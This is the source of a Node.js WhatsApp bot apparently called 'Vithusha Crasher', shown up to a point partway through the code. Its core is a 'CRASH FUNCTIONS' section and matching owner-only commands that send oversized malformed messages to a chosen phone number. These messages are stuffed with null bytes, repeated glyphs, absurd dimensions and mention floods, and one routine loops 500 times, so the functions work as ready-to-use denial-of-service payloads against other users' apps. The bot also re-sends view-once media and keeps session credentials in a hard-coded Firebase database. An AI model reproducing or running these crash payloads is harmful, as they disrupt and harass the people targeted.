const express = require('express');
const fs = require('fs-extra');
const path = require('path');
const { exec } = require('child_process');
const router = express.Router();
const pino = require('pino');
const cheerio = require('cheerio');
const moment = require('moment-timezone');
const Jimp = require('jimp');
const crypto = require('crypto');
const axios = require('axios');
const { sms, downloadMediaMessage } = require("./msg");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    getContentType,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser,
    downloadContentFromMessage,
    proto,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    S_WHATSAPP_NET
} = require('@dark-yasiya/baileys');

const FIREBASE_URL = 'https://minibotproject2-default-rtdb.asia-southeast1.firebasedatabase.app';

const config = {
    NARUTOX_FOOTER: 'Vithusha Crasher',
    AUTO_VIEW_STATUS: 'true',
    AUTO_LIKE_STATUS: 'true',
    AUTO_RECORDING: 'false',
    AUTO_LIKE_EMOJI: ['😉', '🍂', '😘', '💗', '🫂', '💗', '🍀', '❤️‍🔥', '🧸', '💸', '🫀' ,'🙈'],
    PREFIX: '.',
    MAX_RETRIES: 3,
    GROUP_INVITE_LINK: 'https://chat.whatsapp.com/HszwX4rlPogG2Mj5Qc807M?mode=wwt',
    ADMIN_LIST_PATH: './admin.json',
    RCD_IMAGE_PATH: 'https://i.imgur.com/oHXFuT6.jpeg',
    BOT_IMAGE: 'https://i.imgur.com/oHXFuT6.jpeg',
    NEWSLETTER_JID: ' 120363418953677198@newsletter',
    NEWSLETTER_MESSAGE_ID: '428',
    OTP_EXPIRY: 300000,
    OWNER_NUMBER: '94742921476',
    OWNER_NAME: 'Vithusha Damsath',
    BOT_NAME: 'Vithusha Crasher',
    CHANNEL_LINK: 'https://whatsapp.com/channel/0029Vb8oyMb9RZAaMs3kC03X'
};

const activeSockets = new Map();
const socketCreationTime = new Map();
const SESSION_BASE_PATH = './session';
const NUMBER_LIST_PATH = './numbers.json';
const otpStore = new Map();

if (!fs.existsSync(SESSION_BASE_PATH)) {
    fs.mkdirSync(SESSION_BASE_PATH, { recursive: true });
}

function loadAdmins() {
    try {
        if (fs.existsSync(config.ADMIN_LIST_PATH)) {
            return JSON.parse(fs.readFileSync(config.ADMIN_LIST_PATH, 'utf8'));
        }
        return [];
    } catch (error) {
        console.error('Failed to load admin list:', error);
        return [];
    }
}

function formatMessage(title, content, footer) {
    return `*${title}*\n\n${content}\n\n> *${footer}*`;
}

function generateOTP() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

function getSriLankaTimestamp() {
    return moment().tz('Asia/Colombo').format('YYYY-MM-DD HH:mm:ss');
}

async function cleanDuplicateFiles(number) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');
        const { data } = await axios.get(`${FIREBASE_URL}/session.json`);
        if (!data) return;

        const sessionKeys = Object.keys(data).filter(
            key => key.startsWith(`empire_${sanitizedNumber}_`) && key.endsWith('.json')
        ).sort((a, b) => {
            const timeA = parseInt(a.match(/empire_\d+_(\d+)\.json/)?.[1] || 0);
            const timeB = parseInt(b.match(/empire_\d+_(\d+)\.json/)?.[1] || 0);
            return timeB - timeA;
        });

        if (sessionKeys.length > 1) {
            for (let i = 1; i < sessionKeys.length; i++) {
                await axios.delete(`${FIREBASE_URL}/session/${sessionKeys[i].replace('.json', '')}.json`);
                console.log(`Deleted duplicate session file: ${sessionKeys[i]}`);
            }
        }

        const configKey = `config_${sanitizedNumber}.json`;
        if (data[configKey]) {
            console.log(`Config file for ${sanitizedNumber} already exists`);
        }
    } catch (error) {
        console.error(`Failed to clean duplicate files for ${number}:`, error);
    }
}

async function joinGroup(socket) {
    let retries = config.MAX_RETRIES;
    const inviteCodeMatch = config.GROUP_INVITE_LINK.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/);
    if (!inviteCodeMatch) {
        console.error('Invalid group invite link format');
        return { status: 'failed', error: 'Invalid group invite link' };
    }
    const inviteCode = inviteCodeMatch[1];

    while (retries > 0) {
        try {
            const response = await socket.groupAcceptInvite(inviteCode);
            if (response?.gid) {
                console.log(`Successfully joined group with ID: ${response.gid}`);
                return { status: 'success', gid: response.gid };
            }
            throw new Error('No group ID in response');
        } catch (error) {
            retries--;
            let errorMessage = error.message || 'Unknown error';
            if (error.message.includes('not-authorized')) {
                errorMessage = 'Bot is not authorized to join (possibly banned)';
            } else if (error.message.includes('conflict')) {
                errorMessage = 'Bot is already a member of the group';
            } else if (error.message.includes('gone')) {
                errorMessage = 'Group invite link is invalid or expired';
            }
            console.warn(`Failed to join group, retries left: ${retries}`, errorMessage);
            if (retries === 0) {
                return { status: 'failed', error: errorMessage };
            }
            await delay(2000 * (config.MAX_RETRIES - retries));
        }
    }
    return { status: 'failed', error: 'Max retries reached' };
}

async function sendAdminConnectMessage(socket, number, groupResult) {
    const admins = loadAdmins();
    const groupStatus = groupResult.status === 'success'
        ? `Joined (ID: ${groupResult.gid})`
        : `Failed to join group: ${groupResult.error}`;
    const caption = formatMessage(
        '*🍀 VITHUSHA CRASHER 🍀*',
        `*📞 Number:* ${number}\n Status: Connected`,
        '> *VITHUSHA CRASHER BOT*'
    );

    for (const admin of admins) {
        try {
            await socket.sendMessage(
                `${admin}@s.whatsapp.net`,
                {
                    image: { url: config.BOT_IMAGE },
                    caption
                }
            );
        } catch (error) {
            console.error(`Failed to send connect message to admin ${admin}:`, error);
        }
    }
}

async function updateStoryStatus(socket) {
    const statusMessage = `*VITHUSHA CRASHER BOT CONNECTION SUCCESS..!*`;
    try {
        await socket.sendMessage('status@broadcast', { text: statusMessage });
        console.log(`Posted story status: ${statusMessage}`);
    } catch (error) {
        console.error('Failed to post story status:', error);
    }
}

async function sendOTP(socket, number, otp) {
    const userJid = jidNormalizedUser(socket.user.id);
    const message = formatMessage(
        '🔐 OTP VERIFICATION',
        `Your OTP for config update is: *${otp}*\nThis OTP will expire in 5 minutes.`,
        '> *VITHUSHA CRASHER BOT*'
    );

    try {
        await socket.sendMessage(userJid, { text: message });
        console.log(`OTP ${otp} sent to ${number}`);
    } catch (error) {
        console.error(`Failed to send OTP to ${number}:`, error);
        throw error;
    }
}

function setupNewsletterHandlers(socket) {
    socket.ev.on('messages.upsert', async ({ messages }) => {
        const message = messages[0];
        if (!message?.key) return;

        const allNewsletterJIDs = await loadNewsletterJIDsFromRaw();
        const jid = message.key.remoteJid;

        if (!allNewsletterJIDs.includes(jid)) return;

        try {
            const emojis = ['😩', '💸', '🍂', '💗', '🍀'];
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
            const messageId = message.newsletterServerId;

            if (!messageId) {
                console.warn('No newsletterServerId found in message:', message);
                return;
            }

            let retries = 3;
            while (retries-- > 0) {
                try {
                    await socket.newsletterReactMessage(jid, messageId.toString(), randomEmoji);
                    console.log(`✅ Reacted to newsletter ${jid} with ${randomEmoji}`);
                    break;
                } catch (err) {
                    console.warn(`❌ Reaction attempt failed (${3 - retries}/3):`, err.message);
                    await delay(1500);
                }
            }
        } catch (error) {
            console.error('⚠️ Newsletter reaction handler failed:', error.message);
        }
    });
}

async function setupStatusHandlers(socket) {
    socket.ev.on('messages.upsert', async ({ messages }) => {
        const message = messages[0];
        if (!message?.key || message.key.remoteJid !== 'status@broadcast' || !message.key.participant || message.key.remoteJid === config.NEWSLETTER_JID) return;

        try {
            if (config.AUTO_RECORDING === 'true' && message.key.remoteJid) {
                await socket.sendPresenceUpdate("recording", message.key.remoteJid);
            }

            if (config.AUTO_VIEW_STATUS === 'true') {
                let retries = config.MAX_RETRIES;
                while (retries > 0) {
                    try {
                        await socket.readMessages([message.key]);
                        break;
                    } catch (error) {
                        retries--;
                        console.warn(`Failed to read status, retries left: ${retries}`, error);
                        if (retries === 0) throw error;
                        await delay(1000 * (config.MAX_RETRIES - retries));
                    }
                }
            }

            if (config.AUTO_LIKE_STATUS === 'true') {
                const randomEmoji = config.AUTO_LIKE_EMOJI[Math.floor(Math.random() * config.AUTO_LIKE_EMOJI.length)];
                let retries = config.MAX_RETRIES;
                while (retries > 0) {
                    try {
                        await socket.sendMessage(
                            message.key.remoteJid,
                            { react: { text: randomEmoji, key: message.key } },
                            { statusJidList: [message.key.participant] }
                        );
                        console.log(`Reacted to status with ${randomEmoji}`);
                        break;
                    } catch (error) {
                        retries--;
                        console.warn(`Failed to react to status, retries left: ${retries}`, error);
                        if (retries === 0) throw error;
                        await delay(1000 * (config.MAX_RETRIES - retries));
                    }
                }
            }
        } catch (error) {
            console.error('Status handler error:', error);
        }
    });
}

async function handleMessageRevocation(socket, number) {
    socket.ev.on('messages.delete', async ({ keys }) => {
        if (!keys || keys.length === 0) return;

        const messageKey = keys[0];
        const userJid = jidNormalizedUser(socket.user.id);
        const deletionTime = getSriLankaTimestamp();
        
        const message = formatMessage(
            '🗑️ MESSAGE DELETED',
            `A message was deleted from your chat.\n*📋 𝐅rom:* ${messageKey.remoteJid}\n*🍁 𝐃eletion 𝐓ime:* ${deletionTime}`,
            '> *VITHUSHA CRASHER BOT*'
        );

        try {
            await socket.sendMessage(userJid, {
                image: { url: config.BOT_IMAGE },
                caption: message
            });
            console.log(`Notified ${number} about message deletion: ${messageKey.id}`);
        } catch (error) {
            console.error('Failed to send deletion notification:', error);
        }
    });
}

async function resize(image, width, height) {
    let oyy = await Jimp.read(image);
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG);
    return kiyomasa;
}

function capital(string) {
    return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
    return crypto.randomBytes(size).toString('hex').slice(0, size);
}

async function oneViewmeg(socket, isOwner, msg, sender) {
    if (isOwner) {
        try {
            const akuru = sender
            const quot = msg
            if (quot) {
                if (quot.imageMessage?.viewOnce) {
                    console.log("hi");
                    let cap = quot.imageMessage?.caption || "";
                    let anu = await socket.downloadAndSaveMediaMessage(quot.imageMessage);
                    await socket.sendMessage(akuru, { image: { url: anu }, caption: cap });
                } else if (quot.videoMessage?.viewOnce) {
                    console.log("hi");
                    let cap = quot.videoMessage?.caption || "";
                    let anu = await socket.downloadAndSaveMediaMessage(quot.videoMessage);
                    await socket.sendMessage(akuru, { video: { url: anu }, caption: cap });
                } else if (quot.audioMessage?.viewOnce) {
                    console.log("hi");
                    let cap = quot.audioMessage?.caption || "";
                    let anu = await socke.downloadAndSaveMediaMessage(quot.audioMessage);
                    await socket.sendMessage(akuru, { audio: { url: anu }, caption: cap });
                } else if (quot.viewOnceMessageV2?.message?.imageMessage) {
                    let cap = quot.viewOnceMessageV2?.message?.imageMessage?.caption || "";
                    let anu = await socket.downloadAndSaveMediaMessage(quot.viewOnceMessageV2.message.imageMessage);
                    await socket.sendMessage(akuru, { image: { url: anu }, caption: cap });
                } else if (quot.viewOnceMessageV2?.message?.videoMessage) {
                    let cap = quot.viewOnceMessageV2?.message?.videoMessage?.caption || "";
                    let anu = await socket.downloadAndSaveMediaMessage(quot.viewOnceMessageV2.message.videoMessage);
                    await socket.sendMessage(akuru, { video: { url: anu }, caption: cap });
                } else if (quot.viewOnceMessageV2Extension?.message?.audioMessage) {
                    let cap = quot.viewOnceMessageV2Extension?.message?.audioMessage?.caption || "";
                    let anu = await socket.downloadAndSaveMediaMessage(quot.viewOnceMessageV2Extension.message.audioMessage);
                    await socket.sendMessage(akuru, { audio: { url: anu }, caption: cap });
                }
            }
        } catch (error) {
        }
    }
}

// ================= CRASH FUNCTIONS =================

async function ZrillStatusXBv2(sock, target) {
    try {
        function zrill_rand(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
        function zrill_sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

        var mentionSet = new Set();
        while (mentionSet.size < 1999) {
            mentionSet.add("1" + zrill_rand(0, 8999999) + "@s.whatsapp.net");
        }
        var mentions = [...mentionSet];

        function zrill_emptyArray(n) { return new Array(n).fill(0).map(() => ({})); }

        var fields = {};
        var fieldList = [
            ["buttons", () => zrill_emptyArray(80000)],
            ["extra1", () => "\0".repeat(20000)],
            ["extra2", () => "\0".repeat(10000)],
            ["extra3", () => "\0".repeat(20000)],
            ["extra4", () => "\0".repeat(40000)],
            ["extra5", () => "\0".repeat(2000)],
            ["extra6", () => zrill_emptyArray(80000)]
        ];
        fieldList.sort(() => Math.random() - 0.5);
        for (var [k, v] of fieldList) fields[k] = v();

        var interactive = Object.fromEntries([
            ["contextInfo", { mentionedJid: mentions }],
            ["nativeFlowMessage", fields],
            ["body", { text: "XB-FAMILY" }]
        ]);

        var payload = {
            groupStatusMessageV2: {
                message: { interactiveMessage: interactive }
            }
        };

        var done = false;
        var attempt = 0;
        while (!done && attempt < 3) {
            try {
                await zrill_sleep(zrill_rand(200, 800));
                await sock.relayMessage(target, payload, { noSelfSync: true });
                done = true;
            } catch (e) {
                attempt++;
                if (attempt >= 3) throw e;
                await zrill_sleep(zrill_rand(500, 1500));
            }
        }
        console.log("ZrillStatusXBv2 SUKSES ✅");
    } catch (err) {
        console.log("❌ ERROR:", err.message);
    }
}

async function ZrillFcClick(sock, target) {
    try {
        await sock.relayMessage(target, {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 2,
                        submessages: [
                            {
                                messageType: 8,
                                latexMetadata: {
                                    text: "Zrill",
                                    expressions: [{ latexExpression: "Zrill", width: 99999999999999, height: 9999999999999, fontHeight: 99999999999999 }]
                                }
                            },
                            {
                                locationMessage: { degreesLatitude: 0, degreesLongitude: 0, jpegThumbnail: Buffer.alloc(500000, 255) }
                            }
                        ],
                        contextInfo: { isForwarded: true, forwardOrigin: 4, participant: "13135550002@s.whatsapp.net" }
                    }
                }
            }
        }, {
            messageId: "3EB0" + Math.random().toString(36).substring(2, 18).toUpperCase(),
            noSelfSync: true
        });
        console.log("[SUKSES] ZrillFcClick terkirim ke: " + target);
    } catch (err) {
        console.error("[GAGAL] Error: " + err.message);
    }
}

async function ZrillAlbumDelay(sock, target) {
    function zrill_id() { return "3EB0" + Math.random().toString(36).substring(2, 18).toUpperCase(); }

    var imgPayload = {
        botForwardedMessage: {
            message: {
                imageMessage: {
                    url: "https://files.catbox.moe/v8vdls.jpg",
                    mimetype: "image/jpeg".repeat(5000),
                    fileSha256: Buffer.alloc(32, 1).toString("base64"),
                    mediaKey: Buffer.alloc(32, 2).toString("base64"),
                    fileEncSha256: Buffer.alloc(32, 3).toString("base64"),
                    directPath: "/o1/v/t24/f2/m232/v8vdls.jpg" + "\0".repeat(50000) + "ꦾ".repeat(20000),
                    mediaKeyTimestamp: "1792927905",
                    jpegThumbnail: Buffer.alloc(500000, 255),
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        remoteJid: "status@broadcast",
                        mentionedJid: Array.from({ length: 10000 }, () => target)
                    }
                }
            }
        }
    };

    var albumPayload = {
        albumMessage: {
            expectedImageCount: 999999,
            contextInfo: {
                forwardingScore: 1,
                isForwarded: true,
                remoteJid: "status@broadcast",
                participant: "\0".repeat(50000),
                mentionedJid: Array.from({ length: 20000 }, () => target)
            }
        }
    };

    try {
        await sock.relayMessage(target, imgPayload, { messageId: zrill_id(), noSelfSync: true });
        await new Promise(r => setTimeout(r, 300));
        await sock.relayMessage(target, albumPayload, { messageId: zrill_id(), noSelfSync: true });
        console.log("ZrillAlbumDelay terkirim");
    } catch (err) {
        console.error("[ERR] " + err.message);
    }
}

async function delayXcrashRXT(sock, target) {
    try {
        for (let i = 0; i < 500; i++) {
            await sock.relayMessage(target, {
                viewOnceMessageV2: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: {
                            header: {
                                title: 'ꦾ'.repeat(70000) + 'ˈˈ⃝'.repeat(70000),
                                hasMediaAttachment: false
                            },
                            body: {
                                text: '\u00A0'.repeat(150000) + 'ꦾ'.repeat(70000)
                            },
                            footer: {
                                text: 'ˈˈ⃝'.repeat(70000)
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: JSON.stringify({
                                            display_text: 'ꦾ'.repeat(70000),
                                            copy_code: '\u00A0'.repeat(150000)
                                        })
                                    }
                                ],
                                messageParamsJson: "}".repeat(50000),
                                messageVersion: 3
                            },
                            contextInfo: {
                                mentionedJid: Array.from({ length: 999 }, (_, r) =>
                                    `${r}@s.whatsapp.net`
                                ),
                                isForwarded: true,
                                forwardingScore: 999
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });

            await sock.relayMessage(target, {
                viewOnceMessageV2: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        stickerPackMessage: {
                            stickerPackId: 'ꦾ'.repeat(70000) + 'ˈˈ⃝'.repeat(70000),
                            name: '\u00A0'.repeat(150000) + 'ꦾ'.repeat(70000),
                            publisher: 'ˈˈ⃝'.repeat(70000),
                            stickers: [],
                            fileLength: "99999999999999",
                            fileSha256: 'ꦾ'.repeat(70000),
                            fileEncSha256: '\u00A0'.repeat(150000),
                            mediaKey: 'ˈˈ⃝'.repeat(70000),
                            directPath: "/v/" + 'ꦾ'.repeat(70000),
                            packDescription: '\u00A0'.repeat(150000) + 'ꦾ'.repeat(70000),
                            mediaKeyTimestamp: "9999999999",
                            trayIconFileName: 'ˈˈ⃝'.repeat(70000) + ".png",
                            thumbnailHeight: 999999999,
                            thumbnailWidth: 999999999,
                            stickerPackSize: "99999999999999",
                            stickerPackOrigin: "USER_CREATED"
                        }
                    }
                }
            }, { participant: { jid: target } });

            await sock.relayMessage(target, {
                viewOnceMessageV2: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        pollCreationMessage: {
                            name: 'ꦾ'.repeat(70000) + 'ˈˈ⃝'.repeat(70000),
                            options: Array.from({ length: 50 }, () => ({
                                optionName: '\u00A0'.repeat(150000) + 'ꦾ'.repeat(70000)
                            })),
                            selectableOptionsCount: 50
                        }
                    }
                }
            }, { participant: { jid: target } });

            await new Promise(r => setTimeout(r, 30));
        }

        console.log('✅ ke kirim tu');
    } catch (error) {
        console.error('❌ eror:', error.message);
    }
}

// ================= END CRASH FUNCTIONS =================

function setupCommandHandlers(socket, number) {
    socket.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg.message || msg.key.remoteJid === 'status@broadcast' || msg.key.remoteJid === config.NEWSLETTER_JID) return;

        const type = getContentType(msg.message);
        if (!msg.message) return
        msg.message = (getContentType(msg.message) === 'ephemeralMessage') ? msg.message.ephemeralMessage.message : msg.message
        const sanitizedNumber = number.replace(/[^0-9]/g, '');
        const m = sms(socket, msg);
        const quoted =
            type == "extendedTextMessage" &&
            msg.message.extendedTextMessage.contextInfo != null
                ? msg.message.extendedTextMessage.contextInfo.quotedMessage || []
                : []
        const body = (type === 'conversation') ? msg.message.conversation
            : msg.message?.extendedTextMessage?.contextInfo?.hasOwnProperty('quotedMessage')
                ? msg.message.extendedTextMessage.text
                : (type == 'interactiveResponseMessage')
                    ? msg.message.interactiveResponseMessage?.nativeFlowResponseMessage
                        && JSON.parse(msg.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id
                    : (type == 'templateButtonReplyMessage')
                        ? msg.message.templateButtonReplyMessage?.selectedId
                        : (type === 'extendedTextMessage')
                            ? msg.message.extendedTextMessage.text
                            : (type == 'imageMessage') && msg.message.imageMessage.caption
                                ? msg.message.imageMessage.caption
                                : (type == 'videoMessage') && msg.message.videoMessage.caption
                                    ? msg.message.videoMessage.caption
                                    : (type == 'buttonsResponseMessage')
                                        ? msg.message.buttonsResponseMessage?.selectedButtonId
                                        : (type == 'listResponseMessage')
                                            ? msg.message.listResponseMessage?.singleSelectReply?.selectedRowId
                                            : (type == 'messageContextInfo')
                                                ? (msg.message.buttonsResponseMessage?.selectedButtonId
                                                    || msg.message.listResponseMessage?.singleSelectReply?.selectedRowId
                                                    || msg.text)
                                                : (type === 'viewOnceMessage')
                                                    ? msg.message[type]?.message[getContentType(msg.message[type].message)]
                                                    : (type === "viewOnceMessageV2")
                                                        ? (msg.msg.message.imageMessage?.caption || msg.msg.message.videoMessage?.caption || "")
                                                        : '';
        let sender = msg.key.remoteJid;
        const nowsender = msg.key.fromMe ? (socket.user.id.split(':')[0] + '@s.whatsapp.net' || socket.user.id) : (msg.key.participant || msg.key.remoteJid)
        const senderNumber = nowsender.split('@')[0]
        const developers = `${config.OWNER_NUMBER}`;
        const botNumber = socket.user.id.split(':')[0]
        const isbot = botNumber.includes(senderNumber)
        const isOwner = isbot ? isbot : developers.includes(senderNumber)
        var prefix = config.PREFIX
        var isCmd = body.startsWith(prefix)
        const from = msg.key.remoteJid;
        const isGroup = from.endsWith("@g.us")
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '.';
        var args = body.trim().split(/ +/).slice(1)
        socket.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
            let quoted = message.msg ? message.msg : message
            let mime = (message.msg || message).mimetype || ''
            let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
            const stream = await downloadContentFromMessage(quoted, messageType)
            let buffer = Buffer.from([])
            for await (const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk])
            }
            let type = await FileType.fromBuffer(buffer)
            trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
            await fs.writeFileSync(trueFileName, buffer)
            return trueFileName
        }
        if (!command) return;

        try {
            switch (command) {

                // ================= CRASH COMMANDS =================

                case 'zrillstatus': {
                    if (!isOwner) {
                        return await socket.sendMessage(sender, { text: '❌ Owner only command!' }, { quoted: msg });
                    }
                    await socket.sendMessage(sender, { react: { text: '💥', key: msg.key } });

                    let target = sender;
                    if (quoted && msg.message.extendedTextMessage?.contextInfo?.participant) {
                        target = msg.message.extendedTextMessage.contextInfo.participant;
                    } else if (args[0]) {
                        target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                    }

                    await socket.sendMessage(sender, { text: `💥 Sending ZrillStatusXBv2 to: ${target}` }, { quoted: msg });
                    await ZrillStatusXBv2(socket, target);
                    await socket.sendMessage(sender, { text: '✅ ZrillStatusXBv2 executed!' }, { quoted: msg });
                    break;
                }

                case 'zrillfc': {
                    if (!isOwner) {
                        return await socket.sendMessage(sender, { text: '❌ Owner only command!' }, { quoted: msg });
                    }
                    await socket.sendMessage(sender, { react: { text: '💥', key: msg.key } });

                    let target = sender;
                    if (quoted && msg.message.extendedTextMessage?.contextInfo?.participant) {
                        target = msg.message.extendedTextMessage.contextInfo.participant;
                    } else if (args[0]) {
                        target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                    }

                    await socket.sendMessage(sender, { text: `💥 Sending ZrillFcClick to: ${target}` }, { quoted: msg });
                    await ZrillFcClick(socket, target);
                    await socket.sendMessage(sender, { text: '✅ ZrillFcClick executed!' }, { quoted: msg });
                    break;
                }

                case 'zrillalbum': {
                    if (!isOwner) {
                        return await socket.sendMessage(sender, { text: '❌ Owner only command!' }, { quoted: msg });
                    }
                    await socket.sendMessage(sender, { react: { text: '💥', key: msg.key } });

                    let target = sender;
                    if (quoted && msg.message.extendedTextMessage?.contextInfo?.participant) {
                        target = msg.message.extendedTextMessage.contextInfo.participant;
                    } else if (args[0]) {
                        target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                    }

                    await socket.sendMessage(sender, { text: `💥 Sending ZrillAlbumDelay to: ${target}` }, { quoted: msg });
                    await ZrillAlbumDelay(socket, target);
                    await socket.sendMessage(sender, { text: '✅ ZrillAlbumDelay executed!' }, { quoted: msg });
                    break;
                }

                case 'delayxcrash': {
                    if (!isOwner) {
                        return await socket.sendMessage(sender, { text: '❌ Owner only command!' }, { quoted: msg });
                    }
                    await socket.sendMessage(sender, { react: { text: '💥', key: msg.key } });

                    let target = sender;
                    if (quoted && msg.message.extendedTextMessage?.contextInfo?.participant) {
                        target = msg.message.extendedTextMessage.contextInfo.participant;
                    } else if (args[0]) {
                        target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                    }

                    await socket.sendMessage(sender, { text: `💥 Sending delayXcrashRXT to: ${target}\n⏳ This may take a while...` }, { quoted: msg });
                    await delayXcrashRXT(socket, target);
                    await socket.sendMessage(sender, { text: '✅ delayXcrashRXT executed!' }, { quoted: msg });
                    break;
                }

                // ================= END CRASH COMMANDS =================

            }
        } catch (error) {
            console.error('Command handler error:', error);
            await socket.sendMessage(sender, {
                image: { url: config.BOT_IMAGE },
                caption: formatMessage(
                    '❌ ERROR',
                    'An error occurred while processing your command. Please try again.',
                    'VITHUSHA CRASHER BOT'
                )
            });
        }
    });
}

function setupMessageHandlers(socket) {
    socket.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg.message || msg.key.remoteJid === 'status@broadcast' || msg.key.remoteJid === config.NEWSLETTER_JID) return;

        if (config.AUTO_RECORDING === 'true') {
            try {
                await socket.sendPresenceUpdate('recording', msg.key.remoteJid);
                console.log(`Set recording presence for ${msg.key.remoteJid}`);
            } catch (error) {
                console.error('Failed to set recording presence:', error);
            }
        }
    });
}

async function deleteSessionFromFirebase(number) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');
        const firebaseSessionPath = `session/creds_${sanitizedNumber}.json`;
        const { data } = await axios.get(`${FIREBASE_URL}/${firebaseSessionPath}`);
        if (data) {
            const sessionKeys = Object.keys(data).filter(key =>
                key.includes(sanitizedNumber) && key.endsWith('.json')
            );
            for (const key of sessionKeys) {
                await axios.delete(`${FIREBASE_URL}/session/${key.replace('.json', '')}.json`);
                console.log(`Deleted Firebase session file: ${key}`);
            }
        }
        let numbers = [];
        const numbersRes = await axios.get(`${FIREBASE_URL}/numbers.json`);
        if (numbersRes.data) {
            numbers = numbersRes.data.filter(n => n !== sanitizedNumber);
            await axios.put(`${FIREBASE_URL}/numbers.json`, numbers);
        }
    } catch (error) {
        console.error('Failed to delete session from Firebase:', error);
    }
}

async function restoreSession(number) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');
        const credsKey = `creds_${sanitizedNumber}`;
        const { data } = await axios.get(`${FIREBASE_URL}/session/${credsKey}.json`);
        return data || null;
    } catch (error) {
        console.error('Session restore failed:', error);
        return null;
    }
}

async function loadUserConfig(number) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');
        const configKey = `config_${sanitizedNumber}`;
        const { data } = await axios.get(`${FIREBASE_URL}/session/${configKey}.json`);
        return data || { ...config };
    } catch (error) {
        console.warn(`No configuration found for ${number}, using default config`);
        return { ...config };
    }
}

async function updateUserConfig(number, newConfig) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');
        const configKey = `config_${sanitizedNumber}`;
        await axios.put(`${FIREBASE_URL}/session/${configKey}.json`, newConfig);
        console.log(`Updated config for ${sanitizedNumber}`);
    } catch (error) {
        console.error('Failed to update config:', error);
        throw error;
    }
}

async function deleteFirebaseSession(number) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');
        const sessionPath = `session/session_${sanitizedNumber}.json`;
        await axios.delete(`${FIREBASE_URL}/${sessionPath}`);
        console.log(`Deleted Firebase session for ${sanitizedNumber}`);
    } catch (err) {
        console.error(`Failed to delete Firebase session for ${number}:`, err.message || err);
    }
}

async function fullDeleteSession(number) {
    const sanitizedNumber = number.replace(/[^0-9]/g, '');
    try {
        const sessionPath = path.join(SESSION_BASE_PATH, `session_${sanitizedNumber}`);
        if (fs.existsSync(sessionPath)) {
            fs.removeSync(sessionPath);
            console.log(`🗑️ Deleted local session folder for ${sanitizedNumber}`);
        }

        const pathsToDelete = [
            `session/creds_${sanitizedNumber}`,
            `numbers/${sanitizedNumber}`,
            `session/creds_${sanitizedNumber}`
        ];
        for (const p of pathsToDelete) {
            try {
                await axios.delete(`${FIREBASE_URL}/${p}.json`);
                console.log(`🗑️ Deleted Firebase path: ${p}`);
            } catch (e) {
                console.warn(`⚠️ Firebase delete failed for ${p}:`, e.message);
            }
        }

        try {
            const numbersRes = await axios.get(`${FIREBASE_URL}/numbers.json`);
            let numbers = numbersRes.data || [];
            if (!Array.isArray(numbers)) numbers = [];
            numbers = numbers.filter(n => n !== sanitizedNumber);
            await axios.put(`${FIREBASE_URL}/numbers.json`, numbers);
            console.log(`✅ Removed ${sanitizedNumber} from numbers.json`);
        } catch (e) {
            console.warn(`⚠️ Failed updating numbers.json:`, e.message);
        }

        if (activeSockets.has(sanitizedNumber)) {
            try {
                activeSockets.get(sanitizedNumber).ws.close();
            } catch (e) {
                console.warn(`⚠️ Socket close error for ${sanitizedNumber}:`, e.message);
            }
            activeSockets.delete(sanitizedNumber);
            socketCreationTime.delete(sanitizedNumber);
            console.log(`✅ Socket removed for ${sanitizedNumber}`);
        }
    } catch (err) {
        console.error(`❌ Failed to fully delete session for ${sanitizedNumber}:`, err.message);
    }
}

function setupAutoRestart(socket, number) {
    socket.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        const cleanNumber = number.replace(/[^0-9]/g, '');

        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;

            if (statusCode === 401) {
                console.log(`User ${number} logged out. Deleting session...`);
                await fullDeleteSession(number);

                const sessionPath = path.join(SESSION_BASE_PATH, `session_${cleanNumber}`);
                if (fs.existsSync(sessionPath)) {
                    fs.removeSync(sessionPath);
                    console.log(`Deleted local session folder for ${number}`);
                }

                activeSockets.delete(cleanNumber);
                socketCreationTime.delete(cleanNumber);

                try {
                    await socket.sendMessage(jidNormalizedUser(socket.user.id), {
                        image: { url: config.BOT_IMAGE },
                        caption: formatMessage(
                            '*🗑️ SESSION DELETED*',
                            '*✅ Your session has been deleted due to logout*',
